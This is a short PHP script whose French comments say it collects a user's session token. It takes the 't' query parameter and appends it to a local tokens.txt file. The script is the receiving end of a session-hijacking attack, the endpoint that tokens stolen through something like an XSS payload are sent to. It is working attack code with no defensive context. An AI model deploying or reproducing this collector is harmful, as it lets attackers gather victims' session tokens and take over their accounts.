<?php

if (isset($_GET['t'])) {
	
	// Récupération du token de session d'un utilisateur
	// puis sauvegarde dans un fichier texte.

	$file = 'tokens.txt';
	
	$current = file_get_contents($file);
	
	$current .= $_GET['t'] . "\n";
	
	file_put_contents($file, $current);
	
} else {
	
}
